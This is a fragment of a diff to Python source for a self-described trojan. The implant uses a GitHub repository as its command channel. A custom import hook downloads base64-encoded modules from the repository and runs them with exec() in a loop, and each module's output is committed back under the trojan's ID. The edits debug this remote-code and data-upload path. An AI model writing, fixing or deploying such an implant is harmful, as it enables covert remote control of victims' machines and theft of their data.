@@ -52,9 +52,23 @@ def get_trojan_config():
     configured = True
     return config
 def store_module_result(data):
-    gh,repo,branch=connect_to_github()
-    remote_path=f"data/{trojan_id}/{random.randint(1000,10000)}.data"
-    repo.create_file(remote_path,"Commit message",base64.b64encode(data).decode())
+    if data is None:
+        data = ""
+
+    if isinstance(data, (dict, list)):
+        data = json.dumps(data)
+
+    if isinstance(data, str):
+        data = data.encode()
+
+    gh, repo, branch = connect_to_github()
+    remote_path = f"data/{trojan_id}/{random.randint(1000,10000)}.data"
+
+    repo.create_file(
+        remote_path,
+        "Commit message",
+        base64.b64encode(data)
+    )
 class GitImporter:
     def __init__(self):
         self.source = None
@@ -62,7 +76,7 @@ class GitImporter:
     def find_spec(self, fullname, path, target=None):
         print(f"[+] Checking remote module: {fullname}")
 
-        new_library = get_file_contents(f"modules/{fullname}")
+        new_library = get_file_contents(f"modules/{fullname}.py")
         if new_library:
             self.source = base64.b64decode(new_library).decode()
 
@@ -77,15 +91,26 @@ class GitImporter:
         exec(self.source, module.__dict__)
 def module_runner(module):
     task_queue.put(1)
-    mod = importlib.import_module(module)
-    result = mod.run()
-    task_queue.get()
-    store_module_result(result)
+
+    try:
+        if module in sys.modules:
+            del sys.modules[module]
+        print("REQUESTING:", f"modules/{module}.py")
+        __import__(module)
+
+        mod = sys.modules[module]
+        result = mod.run()
+
+        store_module_result(result)
+
+    finally:
+        task_queue.get()
 if __name__=="__main__":
     if(len(sys.argv) != 4):
         print("Usage: %s <github_username> <github_token> <repository_name>" % sys.argv[0])
         sys.exit(0)
     sys.meta_path= [GitImporter()]
+    print("META PATH ACTIVE:", sys.meta_path)
     while True:
         if task_queue.empty():
             config=get_trojan_config()
